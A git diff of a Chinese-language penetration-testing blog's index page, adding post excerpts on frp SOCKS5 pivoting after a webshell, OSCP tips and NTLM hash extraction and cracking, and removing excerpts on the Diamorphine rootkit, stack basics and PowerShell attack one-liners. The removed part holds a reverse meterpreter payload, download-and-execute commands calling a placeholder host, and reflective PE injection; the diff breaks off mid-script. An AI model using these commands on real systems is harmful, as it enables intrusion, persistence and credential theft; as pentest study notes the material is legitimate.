@@ -117,6 +117,292 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2019/05/08/frps.html" >frps的socks5代理</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2019-05-08  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>在PHP的网站getshell之后，有一个比较大的B段内网，测试了一下几个代理都不太好用，最后试了frps，ngrok还没测试。</p>
+<p>首先是reGeorg,如果是Linux的话需要上传no-socket的文件，但是实际测试，网站打开特别慢。 pass</p>
+<p>其次是ew，之前在windows上面测试过ew，效果还不错，不过没有扫描比较大的局域网。这次测试了下，中间扫到一半出现了段错误。pass</p>
+<p>最后试frps，实际效果不错，至少可以解决问题了。配置文件这样的:</p>
+<pre class="line-numbers language-none"><code class="language-none">frps.ini: 
+
+[common]
+bind_port &#x3D; 10086
+privilege_token &#x3D; [passwd]
+max_pool_count &#x3D; 50
+dashboard_port &#x3D; [port]
+dashboard_user &#x3D; [user]
+dashboard_pwd &#x3D; [password]
+use_encryption &#x3D; true
+use_compression &#x3D; true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>上面试在vps上面启动，会在对应端口开一个web服务，看到已经启动的流量和节点存活</p>
+<pre class="line-numbers language-none"><code class="language-none">frpc.ini
+
+[common]
+server_addr &#x3D; [vps ip]
+server_port &#x3D; 10086
+privilege_token &#x3D; [passwd]
+max_pool_count &#x3D; 50
+
+
+[socks5]
+type &#x3D; tcp
+remote_port &#x3D; [port]
+plugin &#x3D; socks5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这个在被控制主机上启动，运行完之后，vps的remote_port端口就会开一个socks5的代理，这样就进入到被控主机的网络里面。nmap扫描要带上<code>-sT -Pn</code>选项。</p>
+
+	
+
+	</div>
+  <a type="button" href="/2019/05/08/frps.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>在PHP的网站getshell之后，有一个比较大的B段内网，测试了一下几个代理都不太好用，最后试了frps，ngrok还没测试。</p>
+<p>首先是reGeorg,如果是Linux的话需要上传no-socket的文件，但是实际测试，网站打开特别慢。 pass</p>
+<p>其次是ew，之前在windows上面测试过ew，效果还不错，不过没有扫描比较大的局域网。这次测试了下，中间扫到一半出现了段错误。pass</p>
+<p>最后试frps，实际效果不错，至少可以解决问题了。配置文件这样的:</p>
+<pre class="line-numbers language-none"><code class="language-none">frps.ini: 
+
+[common]
+bind_port &#x3D; 10086
+privilege_token &#x3D; [passwd]
+max_pool_count &#x3D; 50
+dashboard_port &#x3D; [port]
+dashboard_user &#x3D; [user]
+dashboard_pwd &#x3D; [password]
+use_encryption &#x3D; true
+use_compression &#x3D; true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>上面试在vps上面启动，会在对应端口开一个web服务，看到已经启动的流量和节点存活</p>
+<pre class="line-numbers language-none"><code class="language-none">frpc.ini
+
+[common]
+server_addr &#x3D; [vps ip]
+server_port &#x3D; 10086
+privilege_token &#x3D; [passwd]
+max_pool_count &#x3D; 50
+
+
+[socks5]
+type &#x3D; tcp
+remote_port &#x3D; [port]
+plugin &#x3D; socks5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这个在被控制主机上启动，运行完之后，vps的remote_port端口就会开一个socks5的代理，这样就进入到被控主机的网络里面。nmap扫描要带上<code>-sT -Pn</code>选项。</p>
+
+	
+	</div>
+  <a type="button" href="/2019/05/08/frps.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2019/04/02/OSCP-experience.html" >OSCP经验</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2019-04-02  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="0x01-网络问题"><a href="#0x01-网络问题" class="headerlink" title="0x01: 网络问题"></a>0x01: 网络问题</h2><pre class="line-numbers language-none"><code class="language-none">socks-proxy 127.0.0.1 6876
+uth-user-pass auth.txt
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>在openvpn的配置文件里面，我加了上面两行。<br>第一行因为国内网络不稳定，我加了ss的代理，后来换成了v2ray.<br>第二行是理由同上，因为网络不稳定，每次连接VPN都要输入用户密码，这样方便点.</p>
+<p>具体网络不稳定有两个表现:</p>
+<ol>
+<li>nmap扫描全部的端口长时间没有反应.</li>
+<li>dirbuster扫描的时候会卡死进行不下去了.</li>
+</ol>
+<p>上面两个问题有两个解决方法:</p>
+<ol>
+<li>nmap换成<a target="_blank" rel="noopener" href="https://github.com/AnthraX1/InsightScan">https://github.com/AnthraX1/InsightScan</a>, 先用单文件扫描全部的开放端口，然后用nmap扫描开放端口服务: <code>nmap -sS -sV -sC &lt;IP&gt; -p &lt;PORT&gt;</code></li>
+<li>dirbuster换成gobuster，词典不变，线程控制在25个左右.</li>
+</ol>
+<h2 id="0x02-报告问题"><a href="#0x02-报告问题" class="headerlink" title="0x02: 报告问题"></a>0x02: 报告问题</h2><p>我的报告格式和下面这个人的差不多。如果可以尽量使用官方的模版就用官方的模版，不然容易凉，我写了50多页的报告，做了4道半题目。<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaoxiaoleo/p/9040339.html">https://www.cnblogs.com/xiaoxiaoleo/p/9040339.html</a></p>
+<h2 id="0x03-监考问题"><a href="#0x03-监考问题" class="headerlink" title="0x03: 监考问题"></a>0x03: 监考问题</h2>
+	
+
+	</div>
+  <a type="button" href="/2019/04/02/OSCP-experience.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="0x01-网络问题"><a href="#0x01-网络问题" class="headerlink" title="0x01: 网络问题"></a>0x01: 网络问题</h2><pre class="line-numbers language-none"><code class="language-none">socks-proxy 127.0.0.1 6876
+uth-user-pass auth.txt
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>在openvpn的配置文件里面，我加了上面两行。<br>第一行因为国内网络不稳定，我加了ss的代理，后来换成了v2ray.<br>第二行是理由同上，因为网络不稳定，每次连接VPN都要输入用户密码，这样方便点.</p>
+<p>具体网络不稳定有两个表现:</p>
+<ol>
+<li>nmap扫描全部的端口长时间没有反应.</li>
+<li>dirbuster扫描的时候会卡死进行不下去了.</li>
+</ol>
+<p>上面两个问题有两个解决方法:</p>
+<ol>
+<li>nmap换成<a target="_blank" rel="noopener" href="https://github.com/AnthraX1/InsightScan">https://github.com/AnthraX1/InsightScan</a>, 先用单文件扫描全部的开放端口，然后用nmap扫描开放端口服务: <code>nmap -sS -sV -sC &lt;IP&gt; -p &lt;PORT&gt;</code></li>
+<li>dirbuster换成gobuster，词典不变，线程控制在25个左右.</li>
+</ol>
+<h2 id="0x02-报告问题"><a href="#0x02-报告问题" class="headerlink" title="0x02: 报告问题"></a>0x02: 报告问题</h2><p>我的报告格式和下面这个人的差不多。如果可以尽量使用官方的模版就用官方的模版，不然容易凉，我写了50多页的报告，做了4道半题目。<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaoxiaoleo/p/9040339.html">https://www.cnblogs.com/xiaoxiaoleo/p/9040339.html</a></p>
+<h2 id="0x03-监考问题"><a href="#0x03-监考问题" class="headerlink" title="0x03: 监考问题"></a>0x03: 监考问题</h2>
+	
+	</div>
+  <a type="button" href="/2019/04/02/OSCP-experience.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2019/03/01/hashcat.html" >Hashcat笔记</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2019-03-01  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>在windows里面任意读取的文件，找到了sam.old文件和system.old文件，读取之后用burp保存到文件，可以使用如下的命令来提取密码:</p>
+<pre class="line-numbers language-none"><code class="language-none">root@kali:~# cachedump
+usage: &#x2F;usr&#x2F;bin&#x2F;cachedump &lt;system hive&gt; &lt;security hive&gt;
+
+root@kali:~# lsadump
+usage: &#x2F;usr&#x2F;bin&#x2F;lsadump &lt;system hive&gt; &lt;security hive&gt;
+
+root@kali:~# pwdump
+usage: &#x2F;usr&#x2F;bin&#x2F;pwdump &lt;system hive&gt; &lt;SAM hive&gt;
+
+或者mimikatz: lsadump::sam &#x2F;system:&lt;SYSTEM&gt; &#x2F;SAM:&lt;SAM&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>提取的格式大概是这样:</p>
+<pre class="line-numbers language-none"><code class="language-none">root@kali:~# pwdump system sam
+Administrator:500:41aa818b512a8c0e72381e4c174e281b:1896d0a309184775f67c14d14b5c365a:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HelpAssistant:1000:667d6c58d451dbf236ae37ab1de3b9f7:af733642ab69e156ba0c219d3bbc3c83:::
+SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:8dffa305e2bee837f279c2c0b082affb:::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p>用户名称是:Administrator<br>RID是: 500<br>LM-HASH值: 41aa818b512a8c0e72381e4c174e281b<br>NT-HASH(NTLM)值: 1896d0a309184775f67c14d14b5c365a</p>
+<p>可以使用hashcat来跑密码:</p>
+<pre class="line-numbers language-none"><code class="language-none">hashcat -m 1000 -a 0 --force hash.txt &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>其中的hash.txt 可以指的是上面的NT-HASH。</p>
+<pre class="line-numbers language-none"><code class="language-none">-m 1000 hash的类型，这里是NTLM
+-a 0  0表示词典碰撞，这里是kali自带的辞典，还有3表示使用GPU来爆破，不用指定词典。
+--force 忽略无显卡，直接跑
+hash.txt 就是上面的NT-HASH
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://www.objectif-securite.ch/en/ophcrack.php">https://www.objectif-securite.ch/en/ophcrack.php</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://cyberloginit.com/2017/12/26/hashcat-ntlm-brute-force.html">https://cyberloginit.com/2017/12/26/hashcat-ntlm-brute-force.html</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4">https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4</a></p>
+</li>
+</ul>
+	
+
+	</div>
+  <a type="button" href="/2019/03/01/hashcat.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>在windows里面任意读取的文件，找到了sam.old文件和system.old文件，读取之后用burp保存到文件，可以使用如下的命令来提取密码:</p>
+<pre class="line-numbers language-none"><code class="language-none">root@kali:~# cachedump
+usage: &#x2F;usr&#x2F;bin&#x2F;cachedump &lt;system hive&gt; &lt;security hive&gt;
+
+root@kali:~# lsadump
+usage: &#x2F;usr&#x2F;bin&#x2F;lsadump &lt;system hive&gt; &lt;security hive&gt;
+
+root@kali:~# pwdump
+usage: &#x2F;usr&#x2F;bin&#x2F;pwdump &lt;system hive&gt; &lt;SAM hive&gt;
+
+或者mimikatz: lsadump::sam &#x2F;system:&lt;SYSTEM&gt; &#x2F;SAM:&lt;SAM&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>提取的格式大概是这样:</p>
+<pre class="line-numbers language-none"><code class="language-none">root@kali:~# pwdump system sam
+Administrator:500:41aa818b512a8c0e72381e4c174e281b:1896d0a309184775f67c14d14b5c365a:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HelpAssistant:1000:667d6c58d451dbf236ae37ab1de3b9f7:af733642ab69e156ba0c219d3bbc3c83:::
+SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:8dffa305e2bee837f279c2c0b082affb:::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p>用户名称是:Administrator<br>RID是: 500<br>LM-HASH值: 41aa818b512a8c0e72381e4c174e281b<br>NT-HASH(NTLM)值: 1896d0a309184775f67c14d14b5c365a</p>
+<p>可以使用hashcat来跑密码:</p>
+<pre class="line-numbers language-none"><code class="language-none">hashcat -m 1000 -a 0 --force hash.txt &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>其中的hash.txt 可以指的是上面的NT-HASH。</p>
+<pre class="line-numbers language-none"><code class="language-none">-m 1000 hash的类型，这里是NTLM
+-a 0  0表示词典碰撞，这里是kali自带的辞典，还有3表示使用GPU来爆破，不用指定词典。
+--force 忽略无显卡，直接跑
+hash.txt 就是上面的NT-HASH
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://www.objectif-securite.ch/en/ophcrack.php">https://www.objectif-securite.ch/en/ophcrack.php</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://cyberloginit.com/2017/12/26/hashcat-ntlm-brute-force.html">https://cyberloginit.com/2017/12/26/hashcat-ntlm-brute-force.html</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4">https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4</a></p>
+</li>
+</ul>
+	
+	</div>
+  <a type="button" href="/2019/03/01/hashcat.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2019/01/10/create_function.html" >create_function</a>
 		</h3>
 		</div>
@@ -381,300 +667,6 @@ switch (pcntl_fork()) &#123;
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2018/07/18/lkm-rootkit.html" >LKM Rootkit</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2018-07-18  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://github.com/m0nad/Diamorphine">https://github.com/m0nad/Diamorphine</a>,支持内核2.6.x/3.x/4.x</p>
-<p>编译安装:</p>
-<pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;m0nad&#x2F;Diamorphine
-cd Diamorphine
-make
-insmod diamorphine.ko<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>在<code>diamorphine.h</code>里面定义了<code>MAGIC_PREFIX</code>, 可以自己修改为任意其他东西，比如<code>xx</code>，然后以xx为开头的文件就回全部隐身啦</p>
-<pre class="line-numbers language-none"><code class="language-none">kill -63 0  隐藏(显示) rootkit模块
-rmmod diamorphine   删除rootkit
-kill -64 0  从任意用户切换到root用户
-kill -31 &lt;pid&gt; 隐藏&lt;pid&gt;的进程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-	
-
-	</div>
-  <a type="button" href="/2018/07/18/lkm-rootkit.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://github.com/m0nad/Diamorphine">https://github.com/m0nad/Diamorphine</a>,支持内核2.6.x/3.x/4.x</p>
-<p>编译安装:</p>
-<pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;m0nad&#x2F;Diamorphine
-cd Diamorphine
-make
-insmod diamorphine.ko<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>在<code>diamorphine.h</code>里面定义了<code>MAGIC_PREFIX</code>, 可以自己修改为任意其他东西，比如<code>xx</code>，然后以xx为开头的文件就回全部隐身啦</p>
-<pre class="line-numbers language-none"><code class="language-none">kill -63 0  隐藏(显示) rootkit模块
-rmmod diamorphine   删除rootkit
-kill -64 0  从任意用户切换到root用户
-kill -31 &lt;pid&gt; 隐藏&lt;pid&gt;的进程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-	
-	</div>
-  <a type="button" href="/2018/07/18/lkm-rootkit.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2018/07/05/stack.html" >栈溢出学习笔记</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2018-07-05  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>根据不同的操作系统，一个进程可能被分配到不同内存区域中执行，但是不管什么样的系统，什么样的计算机结构，进程使用的内存可以按照功能分为4个部分：</p>
-<ol>
-<li>代码区：可执行指令</li>
-<li>数据区：用于存储全局变量</li>
-<li>堆区：进程可以在堆区动态的请求一定大小内存，并在用完之后归还给堆区。动态分布和回收是堆区的特点</li>
-<li>栈区：用于动态的存储函数之间的调用关系，以保证被调用函数返回时恢复到母函数中继续执行</li>
-</ol>
-<p>程序中使用的缓冲区可以在堆区、栈区、数据区，不同地方的缓冲区利用方式不同。</p>
-<p>内存中的栈区指的就是系统栈，由系统自动维护。</p>
-<p>栈时FILO结构，所以栈顶指的是最下方，底部是最上方。</p>
-<ul>
-<li>%esp 指向栈的顶部（栈指针寄存器，存放一个指针，永远指向系统栈最上面栈帧的栈顶)</li>
-<li>%ebp 指向栈的底部</li>
-<li>%eip 用来存储即将执行的程序指令的地址</li>
-<li>Frame Pointer(FP) Or Base Pointer(BP), Stack Pointer(SP)</li>
-<li>函数栈帧：ESP和EBP之间内存空间为当前栈帧</li>
-</ul>
-<p>32位x86架构下的通用寄存器包括一般寄存器（eax、ebx、ecx、edx），索引寄存器（esi、edi)，以及堆栈指针寄存器(esp,ebp)</p>
-<ul>
-<li>eax: 累加寄存器(Accumulator),用以进行算数运算和返回函数结果等。</li>
-<li>ebx: 被称为基址寄存器（Base），在内存寻址的时候用来存放基地址。</li>
-<li>exc: 被称为计数寄存器(Counter)，用以在循环中计数。</li>
-<li>edx: 被称为数据寄存器(Data)，常配合eax一起存放运算结果等数据。</li>
-</ul>
-<p>栈操作（在32位下)：</p>
-<ul>
-<li>push（压栈） push sth -&gt; [esp]=sth, esp=esp-4</li>
-<li>pop （出栈） pop sth -&gt; sth=[esp], esp=esp+4</li>
-</ul>
-	
-
-	</div>
-  <a type="button" href="/2018/07/05/stack.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>根据不同的操作系统，一个进程可能被分配到不同内存区域中执行，但是不管什么样的系统，什么样的计算机结构，进程使用的内存可以按照功能分为4个部分：</p>
-<ol>
-<li>代码区：可执行指令</li>
-<li>数据区：用于存储全局变量</li>
-<li>堆区：进程可以在堆区动态的请求一定大小内存，并在用完之后归还给堆区。动态分布和回收是堆区的特点</li>
-<li>栈区：用于动态的存储函数之间的调用关系，以保证被调用函数返回时恢复到母函数中继续执行</li>
-</ol>
-<p>程序中使用的缓冲区可以在堆区、栈区、数据区，不同地方的缓冲区利用方式不同。</p>
-<p>内存中的栈区指的就是系统栈，由系统自动维护。</p>
-<p>栈时FILO结构，所以栈顶指的是最下方，底部是最上方。</p>
-<ul>
-<li>%esp 指向栈的顶部（栈指针寄存器，存放一个指针，永远指向系统栈最上面栈帧的栈顶)</li>
-<li>%ebp 指向栈的底部</li>
-<li>%eip 用来存储即将执行的程序指令的地址</li>
-<li>Frame Pointer(FP) Or Base Pointer(BP), Stack Pointer(SP)</li>
-<li>函数栈帧：ESP和EBP之间内存空间为当前栈帧</li>
-</ul>
-<p>32位x86架构下的通用寄存器包括一般寄存器（eax、ebx、ecx、edx），索引寄存器（esi、edi)，以及堆栈指针寄存器(esp,ebp)</p>
-<ul>
-<li>eax: 累加寄存器(Accumulator),用以进行算数运算和返回函数结果等。</li>
-<li>ebx: 被称为基址寄存器（Base），在内存寻址的时候用来存放基地址。</li>
-<li>exc: 被称为计数寄存器(Counter)，用以在循环中计数。</li>
-<li>edx: 被称为数据寄存器(Data)，常配合eax一起存放运算结果等数据。</li>
-</ul>
-<p>栈操作（在32位下)：</p>
-<ul>
-<li>push（压栈） push sth -&gt; [esp]=sth, esp=esp-4</li>
-<li>pop （出栈） pop sth -&gt; sth=[esp], esp=esp+4</li>
-</ul>
-	
-	</div>
-  <a type="button" href="/2018/07/05/stack.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2018/06/13/powershell-pen.html" >Powershell</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2018-06-13  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<pre class="line-numbers language-none"><code class="language-none">反弹123端口的powershell
-msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;x.x.x. LPORT&#x3D;123 -f psh-reflection &gt;123.ps1
-powershell.exe -exec Bypass -nop -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;x.x.x.x&#x2F;123.ps1&#39;)&quot;
-
-
-端口扫描:
-powershell -exec bypass -c &quot;444..446 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&#39;x.x.x.x&#39;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&quot;
-
-自定义端口和IP
-1..20 | % &#123; $a &#x3D; $_; 1..1024 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;192.168.1.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;
-
-
-1..20 | % &#123; $a &#x3D; $_; write-host &quot;------&quot;; write-host &quot;192.168.1.$a&quot;; 22,53,80,445 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;10.0.0.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;
-169..171 | % &#123; $a &#x3D; $_; write-host &quot;------&quot;; write-host &quot;103.27.177.$a&quot;; 445 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;10.0.0.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;
-
-
-
-powershell.exe -exec Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -enc xxx
-
-内存加载运行:
-powershell.exe -exec bypass -nop -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;clymb3r&#x2F;PowerShell&#x2F;master&#x2F;Invoke-ReflectivePEInjection&#x2F;Invoke-ReflectivePEInjection.ps1&#39;);Invoke-ReflectivePEInjection -PEUrl http:&#x2F;&#x2F;x.x.x.x&#x2F;2.exe -ExeArgs &#39;whoami&#39; -ForceASLR&quot; 
-
-
-下载文件:
-(New-Object System.Net.Webclient).DownloadFile(&quot;http:&#x2F;&#x2F;x.x.x.x&#x2F;k.aspx&quot;,&quot;&quot;)
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<ul>
-<li><a target="_blank" rel="noopener" href="http://rcoil.me/2017/04/PowerShell%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/">http://rcoil.me/2017/04/PowerShell%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</a></li>
-</ul>
-<p>在使用msf生成ps的payload的时候，对于生成的文件格式是hta-psh解码顺序是这样的，对于其中的base64编码，先正常的base64解码，然后提取解码之后中的base64，保存为1.txt，使用如下脚本解码:</p>
-<pre class="line-numbers language-none"><code class="language-none">python decode.py 1.txt
-
-#&#x2F;usr&#x2F;bin&#x2F;env python
-# coding:utf-8
-
-import base64
-import gzip
-import StringIO
-import sys
-
-f &#x3D; sys.argv[1]
-with open(f, &quot;rb&quot;) as file:
-    data &#x3D; file.read()
-
-decoded&#x3D;base64.b64decode(data)
-res &#x3D; StringIO.StringIO(decoded)
-for i in gzip.GzipFile(fileobj&#x3D;res):
-    print i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-
-	</div>
-  <a type="button" href="/2018/06/13/powershell-pen.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<pre class="line-numbers language-none"><code class="language-none">反弹123端口的powershell
-msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;x.x.x. LPORT&#x3D;123 -f psh-reflection &gt;123.ps1
-powershell.exe -exec Bypass -nop -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;x.x.x.x&#x2F;123.ps1&#39;)&quot;
-
-
-端口扫描:
-powershell -exec bypass -c &quot;444..446 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&#39;x.x.x.x&#39;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&quot;
-
-自定义端口和IP
-1..20 | % &#123; $a &#x3D; $_; 1..1024 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;192.168.1.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;
-
-
-1..20 | % &#123; $a &#x3D; $_; write-host &quot;------&quot;; write-host &quot;192.168.1.$a&quot;; 22,53,80,445 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;10.0.0.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;
-169..171 | % &#123; $a &#x3D; $_; write-host &quot;------&quot;; write-host &quot;103.27.177.$a&quot;; 445 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;10.0.0.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;
-
-
-
-powershell.exe -exec Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -enc xxx
-
-内存加载运行:
-powershell.exe -exec bypass -nop -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;clymb3r&#x2F;PowerShell&#x2F;master&#x2F;Invoke-ReflectivePEInjection&#x2F;Invoke-ReflectivePEInjection.ps1&#39;);Invoke-ReflectivePEInjection -PEUrl http:&#x2F;&#x2F;x.x.x.x&#x2F;2.exe -ExeArgs &#39;whoami&#39; -ForceASLR&quot; 
-
-
-下载文件:
-(New-Object System.Net.Webclient).DownloadFile(&quot;http:&#x2F;&#x2F;x.x.x.x&#x2F;k.aspx&quot;,&quot;&quot;)
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<ul>
-<li><a target="_blank" rel="noopener" href="http://rcoil.me/2017/04/PowerShell%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/">http://rcoil.me/2017/04/PowerShell%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</a></li>
-</ul>
-<p>在使用msf生成ps的payload的时候，对于生成的文件格式是hta-psh解码顺序是这样的，对于其中的base64编码，先正常的base64解码，然后提取解码之后中的base64，保存为1.txt，使用如下脚本解码:</p>
-<pre class="line-numbers language-none"><code class="language-none">python decode.py 1.txt
-
-#&#x2F;usr&#x2F;bin&#x2F;env python
-# coding:utf-8
-
-import base64
-import gzip
-import StringIO
-import sys
-
-f &#x3D; sys.argv[1]
-with open(f, &quot;rb&quot;) as file:
-    data &#x3D; file.read()
-
-decoded&#x3D;base64.b64decode(data)
-res &#x3D; StringIO.StringIO(decoded)
-for i in gzip.GzipFile(fileobj&#x3D;res):
